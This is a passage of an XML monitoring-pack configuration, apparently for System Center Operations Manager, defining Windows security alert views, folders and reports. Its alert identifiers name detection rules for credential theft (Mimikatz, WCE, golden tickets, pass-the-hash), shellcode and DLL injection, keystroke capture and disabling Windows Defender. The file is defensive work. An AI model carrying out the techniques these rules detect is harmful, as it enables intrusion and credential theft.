          <ColumnInfo Index="8" SortIndex="1" Width="100" Grouped="false" Sorted="true" IsSortable="true" Visible="true" SortOrder="Ascending">
            <Name>Age</Name>
            <Id>Age</Id>
          </ColumnInfo>
          <ColumnInfo Index="9" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Type</Name>
            <Id>Category</Id>
          </ColumnInfo>
          <ColumnInfo Index="10" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Owner</Name>
            <Id>Owner</Id>
          </ColumnInfo>
          <ColumnInfo Index="11" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Priority</Name>
            <Id>Priority</Id>
          </ColumnInfo>
          <ColumnInfo Index="12" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Latency</Name>
            <Id>Latency</Id>
          </ColumnInfo>
          <ColumnInfo Index="13" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Description</Name>
            <Id>Description</Id>
          </ColumnInfo>
          <ColumnInfo Index="14" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Connector</Name>
            <Id>ConnectorId</Id>
          </ColumnInfo>
          <ColumnInfo Index="15" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Forwarding Status</Name>
            <Id>ConnectorStatus</Id>
          </ColumnInfo>
          <ColumnInfo Index="16" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Class</Name>
            <Id>Class</Id>
          </ColumnInfo>
          <ColumnInfo Index="17" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Time in State</Name>
            <Id>TimeInState</Id>
          </ColumnInfo>
          <ColumnInfo Index="18" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Custom Field 1</Name>
            <Id>CustomField1</Id>
          </ColumnInfo>
          <ColumnInfo Index="19" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Custom Field 2</Name>
            <Id>CustomField2</Id>
          </ColumnInfo>
          <ColumnInfo Index="20" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Custom Field 3</Name>
            <Id>CustomField3</Id>
          </ColumnInfo>
          <ColumnInfo Index="21" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Custom Field 4</Name>
            <Id>CustomField4</Id>
          </ColumnInfo>
          <ColumnInfo Index="22" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Custom Field 5</Name>
            <Id>CustomField5</Id>
          </ColumnInfo>
          <ColumnInfo Index="23" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Custom Field 6</Name>
            <Id>CustomField6</Id>
          </ColumnInfo>
          <ColumnInfo Index="24" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Custom Field 7</Name>
            <Id>CustomField7</Id>
          </ColumnInfo>
          <ColumnInfo Index="25" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Custom Field 8</Name>
            <Id>CustomField8</Id>
          </ColumnInfo>
          <ColumnInfo Index="26" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Custom Field 9</Name>
            <Id>CustomField9</Id>
          </ColumnInfo>
          <ColumnInfo Index="27" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Custom Field 10</Name>
            <Id>CustomField10</Id>
          </ColumnInfo>
          <ColumnInfo Index="28" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Resolved By</Name>
            <Id>ResolvedBy</Id>
          </ColumnInfo>
          <ColumnInfo Index="29" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Time Resolved</Name>
            <Id>TimeResolved</Id>
          </ColumnInfo>
          <ColumnInfo Index="30" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Last State Change</Name>
            <Id>TimeResolutionStateLastModified</Id>
          </ColumnInfo>
          <ColumnInfo Index="31" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Last Modified</Name>
            <Id>LastModified</Id>
          </ColumnInfo>
          <ColumnInfo Index="32" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Last Modified By</Name>
            <Id>LastModifiedBy</Id>
          </ColumnInfo>
          <ColumnInfo Index="33" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Management Group</Name>
            <Id>ManagementGroup</Id>
          </ColumnInfo>
          <ColumnInfo Index="34" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Site</Name>
            <Id>SiteName</Id>
          </ColumnInfo>
          <ColumnInfo Index="35" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Repeat Count</Name>
            <Id>RepeatCount</Id>
          </ColumnInfo>
          <ColumnInfo Index="36" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Ticket ID</Name>
            <Id>TicketId</Id>
          </ColumnInfo>
          <ColumnInfo Index="37" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>TFS Work Item ID</Name>
            <Id>TfsWorkItemId</Id>
          </ColumnInfo>
          <ColumnInfo Index="38" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>TFS Work Item Owner</Name>
            <Id>TfsWorkItemOwner</Id>
          </ColumnInfo>
        </Presentation>
        <Target />
      </View>
      <View ID="SecurityMonitoringMP.View.DCDistributedApp" Accessibility="Public" Enabled="true" Target="Security.Monitoring.SecurityMonitoringDA.DomainControllers" TypeID="SystemCenter!Microsoft.SystemCenter.StateViewType" Visible="true">
        <Category>Operations</Category>
        <Criteria>
          <InMaintenanceMode>false</InMaintenanceMode>
        </Criteria>
        <Presentation>
          <ColumnInfo Index="0" SortIndex="0" Width="100" Grouped="false" Sorted="true" IsSortable="true" Visible="true" SortOrder="Descending">
            <Name>State</Name>
            <Id>Security.Monitoring.SecurityMonitoringDA.DomainControllers-*-bf03272f-60d6-dbdd-8561-ea2794f7792e-*-Health</Id>
          </ColumnInfo>
          <ColumnInfo Index="1" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="true" SortOrder="Ascending">
            <Name>Maintenance Mode</Name>
            <Id>InMaintenanceMode</Id>
          </ColumnInfo>
          <ColumnInfo Index="2" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="true" SortOrder="Ascending">
            <Name>Name</Name>
            <Id>Name</Id>
          </ColumnInfo>
          <ColumnInfo Index="3" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="true" SortOrder="Ascending">
            <Name>Path</Name>
            <Id>Path</Id>
          </ColumnInfo>
          <ColumnInfo Index="4" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Display Name</Name>
            <Id>System.Entity/DisplayName</Id>
          </ColumnInfo>
          <ColumnInfo Index="5" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Domain Name</Name>
            <Id>Security.Monitoring.SecurityMonitoringDA.DomainControllers/DomainDnsName</Id>
          </ColumnInfo>
          <ColumnInfo Index="6" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Windows Domain Controller</Name>
            <Id>Microsoft.Windows.Server.DC.Computer</Id>
          </ColumnInfo>
        </Presentation>
        <Target />
      </View>
      <View ID="SecurityMonitoringMP.View.MemberServerDistributedApp" Accessibility="Public" Enabled="true" Target="Security.Monitoring.SecurityMonitoringDA.MemberServers" TypeID="SystemCenter!Microsoft.SystemCenter.StateViewType" Visible="true">
        <Category>Operations</Category>
        <Criteria>
          <InMaintenanceMode>false</InMaintenanceMode>
        </Criteria>
        <Presentation>
          <ColumnInfo Index="0" SortIndex="0" Width="100" Grouped="false" Sorted="true" IsSortable="true" Visible="true" SortOrder="Descending">
            <Name>State</Name>
            <Id>Security.Monitoring.SecurityMonitoringDA.MemberServers-*-b3c29b00-6069-f869-8cdf-4c07205932e6-*-Health</Id>
          </ColumnInfo>
          <ColumnInfo Index="1" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="true" SortOrder="Ascending">
            <Name>Maintenance Mode</Name>
            <Id>InMaintenanceMode</Id>
          </ColumnInfo>
          <ColumnInfo Index="2" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="true" SortOrder="Ascending">
            <Name>Name</Name>
            <Id>Name</Id>
          </ColumnInfo>
          <ColumnInfo Index="3" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="true" SortOrder="Ascending">
            <Name>Path</Name>
            <Id>Path</Id>
          </ColumnInfo>
          <ColumnInfo Index="4" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Display Name</Name>
            <Id>System.Entity/DisplayName</Id>
          </ColumnInfo>
          <ColumnInfo Index="5" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Domain Name</Name>
            <Id>Security.Monitoring.SecurityMonitoringDA.MemberServers/DomainDnsName</Id>
          </ColumnInfo>
          <ColumnInfo Index="6" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Windows Server</Name>
            <Id>Microsoft.Windows.Server.Computer</Id>
          </ColumnInfo>
          <ColumnInfo Index="7" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Windows Server 2012 Computer</Name>
            <Id>Microsoft.Windows.Server.6.2.Computer</Id>
          </ColumnInfo>
          <ColumnInfo Index="8" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Windows Server 2016 Computer</Name>
            <Id>Microsoft.Windows.Server.10.0.Computer</Id>
          </ColumnInfo>
          <ColumnInfo Index="9" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Windows Domain Controller</Name>
            <Id>Microsoft.Windows.Server.DC.Computer</Id>
          </ColumnInfo>
          <ColumnInfo Index="10" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Virtual Server</Name>
            <Id>Microsoft.Windows.Cluster.VirtualServer</Id>
          </ColumnInfo>
          <ColumnInfo Index="11" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Security Monitoring: User Writeable Directories Seed Class</Name>
            <Id>Security.Monitoring.WriteableLocationsSeedClass</Id>
          </ColumnInfo>
          <ColumnInfo Index="12" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Windows Server 2016 Computer (Nano)</Name>
            <Id>Microsoft.Windows.Server.10.0.Nano.Computer</Id>
          </ColumnInfo>
          <ColumnInfo Index="13" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Windows Server 2012 Full Computer</Name>
            <Id>Microsoft.Windows.Server.6.2.Full.Computer</Id>
          </ColumnInfo>
          <ColumnInfo Index="14" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Windows Server 2016 Computer (Full)</Name>
            <Id>Microsoft.Windows.Server.10.0.Full.Computer</Id>
          </ColumnInfo>
          <ColumnInfo Index="15" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Windows Server 2016 Computer (Core)</Name>
            <Id>Microsoft.Windows.Server.10.0.Core.Computer</Id>
          </ColumnInfo>
          <ColumnInfo Index="16" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Windows Server 2012 Core Computer</Name>
            <Id>Microsoft.Windows.Server.6.2.Core.Computer</Id>
          </ColumnInfo>
          <ColumnInfo Index="17" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Windows Server 2012 R2 Computer</Name>
            <Id>Microsoft.Windows.Server.2012.R2.Computer</Id>
          </ColumnInfo>
          <ColumnInfo Index="18" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Windows Server 2012 R2 Core Computer</Name>
            <Id>Microsoft.Windows.Server.2012.R2.Core.Computer</Id>
          </ColumnInfo>
          <ColumnInfo Index="19" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Windows Server 2012 R2 Full Computer</Name>
            <Id>Microsoft.Windows.Server.2012.R2.Full.Computer</Id>
          </ColumnInfo>
        </Presentation>
        <Target />
      </View>
    </Views>
    <Folders>
      <Folder ID="SecurityMonitoringMP.Folder.SecurityMonitoring" Accessibility="Public" ParentFolder="SystemCenter!Microsoft.SystemCenter.Monitoring.ViewFolder.Root" />
      <Folder ID="SecurityMonitoringMP.Folder.Administration" Accessibility="Public" ParentFolder="SecurityMonitoringMP.Folder.SecurityMonitoring" />
      <Folder ID="SecurityMonitoringMP.Folder.EventCollectors" Accessibility="Public" ParentFolder="SecurityMonitoringMP.Folder.SecurityMonitoring" />
    </Folders>
    <FolderItems>
      <FolderItem ElementID="SecurityMonitoringMP.View.SecurityMonitoringAlerts" ID="i08b0d1b442c04c8daf4574e19f39c3c9" Folder="SecurityMonitoringMP.Folder.SecurityMonitoring" />
      <FolderItem ElementID="SecurityMonitoringMP.View.DCDistributedApp" ID="i23e6b51216814447b3b73c5124fae3d3" Folder="SecurityMonitoringMP.Folder.Administration" />
      <FolderItem ElementID="SecurityMonitoringMP.View.MemberServerDistributedApp" ID="i2465151f071a4563af2090f8f6f734ce" Folder="SecurityMonitoringMP.Folder.Administration" />
      <FolderItem ElementID="SecurityMonitoringMP.View.EventCollectorState" ID="i3691038e88044516a67ac5bbc79422c0" Folder="SecurityMonitoringMP.Folder.EventCollectors" />
      <FolderItem ElementID="SecurityMonitoringMP.View.EventCollectorAlerts" ID="if3e38fad5d3547168a4bca954c52cecb" Folder="SecurityMonitoringMP.Folder.EventCollectors" />
      <FolderItem ElementID="SecurityMonitoringMP.View.ThreatHuntingAlert" ID="i74a5ba1881174da89a4041962320a070" Folder="SecurityMonitoringMP.Folder.SecurityMonitoring" />
    </FolderItems>
    <StringResources>
      <StringResource ID="Security.Monitoring.Event.SeDebugPrivilegeEscalation.AlertMessage" />
      <StringResource ID="Security.Monitoring.SecurityMonitoring.Event.DCOUModify.AlertMessage" />
      <StringResource ID="Security.Monitoring.ExecutableRunFromUserWriteableDirectory.AlertMessage" />
      <StringResource ID="Security.Monitoring.ExecutableRuninWriteableDirectoriesExtended.AlertMessage" />
      <StringResource ID="Security.Monitoring.Event.4688.GenericCryptoRansomWare.AlertMessage" />
      <StringResource ID="Security.Monitoring.SecurityMonitoring.Event.GPOCreation.AlertMessage" />
      <StringResource ID="Security.Monitoring.SecurityMonitoring.Event.GPODeletionRule.AlertMessage" />
      <StringResource ID="Security.Monitoring.Event.KillWindowsDefender.AlertMessage" />
      <StringResource ID="Security.Monitoring.Event.ByPassExecutionPolicy.AlertMessage" />
      <StringResource ID="Security.Monitoring.Event.InvokeEncodedCommand.AlertMessage" />
      <StringResource ID="Security.Monitoring.Event.InvokeRemoteExpression.AlertMessage" />
      <StringResource ID="Security.Monitoring.Event.PowerShellRuninMemoryOnly.AlertMessage" />
      <StringResource ID="Security.Monitoring.Event.RemoteRegSvr32.AlertMessage" />
      <StringResource ID="Security.Monitoring.SecurityMonitoring.Event.ScheduledTaskCreatedOnServer.AlertMessage" />
      <StringResource ID="Security.Monitoring.SecurityLogClearedv2.AlertMessage" />
      <StringResource ID="Security.Monitoring.SecurityMonitoring.Event.ServiceCreatedonDC.AlertMessage" />
      <StringResource ID="Security.Monitoring.SuspiciousUserContext.AlertMessage" />
      <StringResource ID="Security.Monitoring.SystemLogClearedv2.AlertMessage" />
      <StringResource ID="Security.Monitoring.Event.WMIPersistence.AlertMessage" />
      <StringResource ID="Security.Monitoring.Event.WMIRemote.Destination.AlertMessage" />
      <StringResource ID="Security.Monitoring.Event.WMIRemote.Source.AlertMessage" />
      <StringResource ID="Security.Monitoring.ForwardedEvents.DebugEscalation.AlertMessage" />
      <StringResource ID="Security.Monitoring.ForwardedEvents.ExecutableRunFromUserWriteableDirectory.AlertMessage" />
      <StringResource ID="Security.Monitoring.ForwardedEvents.FindAVSignature.AlertMessage" />
      <StringResource ID="Security.Monitoring.ForwardedEvents.4688.GenericCryptoRansomWare.AlertMessage" />
      <StringResource ID="Security.Monitoring.ForwardedEvents.GetDLLLoadPath.AlertMessage" />
      <StringResource ID="Security.Monitoring.ForwardedEvents.GetHTTPStatus.AlertMessage" />
      <StringResource ID="Security.Monitoring.ForwardedEvents.GetKeystroke.AlertMessage" />
      <StringResource ID="Security.Monitoring.PowerShellLog.InvokeDLLInjection.AlertMessage" />
      <StringResource ID="Security.Monitoring.ForwardedEvents.InvokeMimikatz.AlertMessage" />
      <StringResource ID="Security.Monitoring.ForwardedEvents.InvokeNinjaCopy.AlertMessage" />
      <StringResource ID="Security.Monitoring.ForwardedEvents.InvokePortScan.AlertMessage" />
      <StringResource ID="Security.Monitoring.ForwardedEvents.InvokeShellCodeInUse.AlertMessage" />
      <StringResource ID="Security.Monitoring.ForwardedEvents.KillWindowsDefender.AlertMessage" />
      <StringResource ID="Security.Monitoring.ForwardedEvents.ByPassExecutionPolicy.AlertMessage" />
      <StringResource ID="Security.Monitoring.ForwardedEvents.PowerShellStartHiddenProcess.AlertMessage" />
      <StringResource ID="Security.Monitoring.ForwardedEvents.InvokeRemoteExpression.AlertMessage" />
      <StringResource ID="Security.Monitoring.ForwardedEvents.InvokeEncodedCommand.AlertMessage" />
      <StringResource ID="Security.Monitoring.ForwardedEvents.PowerShellRuninMemoryOnly.AlertMessage" />
      <StringResource ID="Security.Monitoring.ForwardedEvents.RemoteRegSvr32.AlertMessage" />
      <StringResource ID="Security.Monitoring.Monitors.AuthenticationPackages.AlertMessage" />
      <StringResource ID="Security.Monitoring.PowerShellLog.FindAVSignature.AlertMessage" />
      <StringResource ID="Security.Monitoring.PowerShellLog.GetDLLLoadPath.AlertMessage" />
      <StringResource ID="Security.Monitoring.PowerShellLog.GetHTTPStatus.AlertMessage" />
      <StringResource ID="Security.Monitoring.PowerShellLog.GetKeystroke.AlertMessage" />
      <StringResource ID="Security.Monitoring.ForwardedEvents.InvokeDLLInjection.AlertMessage" />
      <StringResource ID="Security.Monitoring.PowerShellLog.InvokeMimikatzInUse.AlertMessage" />
      <StringResource ID="Security.Monitoring.PowerShellLog.InvokeNinjaCopy.AlertMessage" />
      <StringResource ID="Security.Monitoring.PowerShellLog.InvokePortScan.AlertMessage" />
      <StringResource ID="Security.Monitoring.PowerShellLog.InvokeShellCodeInUse.AlertMessage" />
      <StringResource ID="Security.Monitoring.PowerShellLog.PowerShellStartHiddenProcess.AlertMessage" />
      <StringResource ID="SecurityMonitoringMP.UseLogonCredentialExistsMonitor_AlertMessageResourceID" />
      <StringResource ID="SecurityMonitoringMP.APPLocker.PSExec.AlertMessage" />
      <StringResource ID="SecurityMonitoringMP.APPLocker.WCE.AlertMessage" />
      <StringResource ID="SecurityMonitoringMP.APPLocker.Mimikatz.AlertMessage" />
      <StringResource ID="SecurityMonitoringMP.APPLocker.ProhibitedApp.AlertMessage" />
      <StringResource ID="SecurityMonitoringMP.APPLocker.WinRar.AlertMessage" />
      <StringResource ID="SecurityMonitoringMP.Health.EventCollectorMonitor_AlertMessageResourceID" />
      <StringResource ID="SecurityMonitoringMP.Pth.CredentialSwap.AlertMessage" />
      <StringResource ID="SecurityMonitoringMP.Accounts.DomainAdminChange.AlertMessage" />
      <StringResource ID="SecurityMonitoringMP.WDigestRegConfiguredMonitor_AlertMessageResourceID" />
      <StringResource ID="SecurityMonitoringMP.Accounts.SchemaAdminChange.AlertMessage" />
      <StringResource ID="SecurityMonitoringMP.Accounts.EnterpriseAdminChange.AlertMessage" />
      <StringResource ID="SecurityMonitoringMP.Event.SecurityLogCleared.AlertMessage" />
      <StringResource ID="SecurityMonitoringMP.Event.ServiceCreatedonMemberServer.AlertMessage" />
      <StringResource ID="SecurityMonitoringMP.ThreatHunt.SpecialGroupLogon.AlertMessage" />
      <StringResource ID="SecurityMonitoringMP.Event.LocalAccountCreatedonServer.AlertMessage" />
      <StringResource ID="SecurityMonitoringMP.Event.ServiceKnownThreat.AlertMessage" />
      <StringResource ID="SecurityMonitoringMP.ThreatHunt.BatchLogonInUse.AlertMessage" />
      <StringResource ID="SecurityMonitoringMP.ForwardedEvents.SecurityLogCleared.AlertMessage" />
      <StringResource ID="SecurityMonitoringMP.ForwardedEvents.SpecialGroupLogon.AlertMessage" />
      <StringResource ID="SecurityMonitoringMP.ForwardedEvents.ServiceCreation.AlertMessage" />
      <StringResource ID="SecurityMonitoringMP.ForwardedEvents.ServiceCreationKnownThreats.AlertMessage" />
      <StringResource ID="SecurityMonitoringMP.ForwardedEvents.CredentialSwap.AlertMessage" />
      <StringResource ID="SecurityMonitoringMP.ForwardedEvents.LocalUserCreatedDeleted.AlertMessage" />
      <StringResource ID="SecurityMonitoringMP.ForwardedEvents.ProhibitedApp.AlertMessage" />
      <StringResource ID="SecurityMonitoringMP.Event.SmartCardDisabled.AlertMessage" />
      <StringResource ID="SecurityMonitoringMP.Accounts.LocalAdminChange.AlertMessage" />
      <StringResource ID="SecurityMonitoringMP.Event.GoldenTicketDetection.AlertMessage" />
      <StringResource ID="SecurityMonitoringMP.Event.SystemLogCleared.AlertMessage" />
      <StringResource ID="SecurityMonitoringMP.ForwardedEvents.SystemLogCleared.AlertMessage" />
      <StringResource ID="SecurityMonitoringMP.GPOMonitoring.EventAndScript.Rule.GPOChange.AlertMessage" />
      <StringResource ID="SecurityMonitoringMP.Event.RepeatedLogonMonitor_AlertMessageResourceID" />
      <StringResource ID="SecurityMonitoringMP.Event.4688.SuspiciousCMD.AlertMessage" />
      <StringResource ID="SecurityMonitoringMP.Event.4688.SuspiciousReg.AlertMessage" />
      <StringResource ID="SecurityMonitoringMP.Event.4688.SuspiciousApplockerJava.AlertMessage" />
      <StringResource ID="SecurityMonitoringMP.Event.4688.SuspiciousFTPCommand.AlertMessage" />
      <StringResource ID="SecurityMonitoringMP.Event.4688.SuspiciousApplockerRegsvr.AlertMessage" />
      <StringResource ID="SecurityMonitoringMP.Event.4688.SuspiciousWindowsPosition.AlertMessage" />
      <StringResource ID="SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousCMD.AlertMessage" />
      <StringResource ID="SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousReg.AlertMessage" />
      <StringResource ID="SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousApplockerJava.AlertMessage" />
      <StringResource ID="SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousFTPCommand.AlertMessage" />
      <StringResource ID="SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousApplockerRegsvr.AlertMessage" />
      <StringResource ID="SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousWindowsPosition.AlertMessage" />
      <StringResource ID="SecurityMonitoringMP.Event.SystemPendingRestart_AlertMessageResourceID" />
      <StringResource ID="SecurityMonitoringMP.Event.SoftwareInstallOnServer.AlertMessage" />
      <StringResource ID="SecurityMonitoringMP.Event.UnexpectedShutdown.AlertMessage" />
      <StringResource ID="SecurityMonitoringMP.Event.SystemRestarted.AlertMessage" />
      <StringResource ID="SecurityMonitoringMP.Event.SystemPoweredOff.AlertMessage" />
      <StringResource ID="SecurityMonitoringMP.Event.SoftwareRemovedFromServer.AlertMessage" />
      <StringResource ID="SecurityMonitoring.Event.FailedLogin.AlertMessage" />
    </StringResources>
  </Presentation>
  <Reporting>
    <Reports>
      <Report ID="Security.Monitoring.FailedLoginDetails" Accessibility="Public" Visible="true">
        <ReportDefinition>FailedLoginDetails.ID</ReportDefinition>
      </Report>
      <Report ID="Security.Monitoring.AccountLockout" Accessibility="Public" Visible="true">
        <ReportDefinition>AccountLockout.ID</ReportDefinition>
      </Report>
      <Report ID="Security.Monitoring.FailedLoginSummary" Accessibility="Public" Visible="true">
        <ReportDefinition>FailedLoginSummary.ID</ReportDefinition>
      </Report>
      <Report ID="Security.Monitoring.FailedLoginSummary24Hours" Accessibility="Public" Visible="true">
        <ReportDefinition>FailedLoginSummary24.ID</ReportDefinition>
      </Report>
      <Report ID="Security.Monitoring.AlertSummary" Accessibility="Public" Visible="true">
        <ReportDefinition>AlertSummary.ID</ReportDefinition>
      </Report>
      <Report ID="Security.Monitoring.EventCollectionSummary" Accessibility="Public" Visible="true">
        <ReportDefinition>EventCollectionSummary.ID</ReportDefinition>
      </Report>
      <Report ID="Security.Monitoring.BatchLogonReport" Accessibility="Public" Visible="true">
        <ReportDefinition>BatchLogonReport.ID</ReportDefinition>
      </Report>
      <Report ID="Security.Monitoring.SMBv1ConnectionReport" Accessibility="Public" Visible="true">
        <ReportDefinition>SMBv1ConnectionReport.ID</ReportDefinition>
      </Report>
      <Report ID="Security.Monitoring.LanManConnectionReport" Accessibility="Public" Visible="true">
        <ReportDefinition>LanManConnectionReport.ID</ReportDefinition>
      </Report>
      <Report ID="Security.Monitoring.NTLMv1ConnectionReport" Accessibility="Public" Visible="true">
        <ReportDefinition>NTLMv1ConnectionReport.ID</ReportDefinition>
      </Report>
      <Report ID="Security.Monitoring.WDigestConnectionReport" Accessibility="Public" Visible="true">
        <ReportDefinition>WDigestConnectionReport.ID</ReportDefinition>
      </Report>
      <Report ID="Security.Monitoring.LegacyTLSConnectionReport" Accessibility="Public" Visible="true">
        <ReportDefinition>LegacyTLSConnectionReport.ID</ReportDefinition>
      </Report>
    </Reports>
  </Reporting>
  <LanguagePacks>
    <LanguagePack ID="ENU" IsDefault="true">
      <DisplayStrings>
        <DisplayString ElementID="Security.Monitoring.AdminAccounts">
          <Name>Security Monitoring: Administrative Accounts Class</Name>
          <Description>This is simply an inventory of Administrative Accounts</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.AdminAccounts" SubElementID="DistinguishedName">
          <Name>Distinguished Name</Name>
          <Description />
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.AdminAccounts" SubElementID="Enabled">
          <Name>Enabled</Name>
          <Description />
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.AdminAccounts" SubElementID="Name">
          <Name>Name</Name>
          <Description />
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.AdminAccounts" SubElementID="SAMAccountName">
          <Name>Account Name</Name>
          <Description />
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.AdminAccounts" SubElementID="UPN">
          <Name>User Principal Name</Name>
          <Description />
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.PDC_Emulator">
          <Name>Security Monitoring: PDC Emulator Class</Name>
          <Description />
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.PDC_Emulator" SubElementID="Name">
          <Name>Distinguished Name</Name>
          <Description />
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.SecurityMonitoringDA">
          <Name>Security Monitoring Configuration</Name>
          <Description>This class serves as a placeholder for configuration monitors to the Security Monitoring Class</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.SecurityMonitoringDA.DomainControllers">
          <Name>Security Monitoring Configuration Domain Controllers</Name>
          <Description>This class serves as a placeholder for configuration monitors to the Security Monitoring Class</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.SecurityMonitoringDA.MemberServers">
          <Name>Security Monitoring Configuration Member Servers</Name>
          <Description>This class serves as a placeholder for configuration monitors to the Security Monitoring Class</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.SecurityMonitoringDA.DomainControllers" SubElementID="DomainDnsName">
          <Name>Domain Name</Name>
          <Description>Domain DNS Name for Monitored Domain Controllers.</Description>
        </DisplayString>
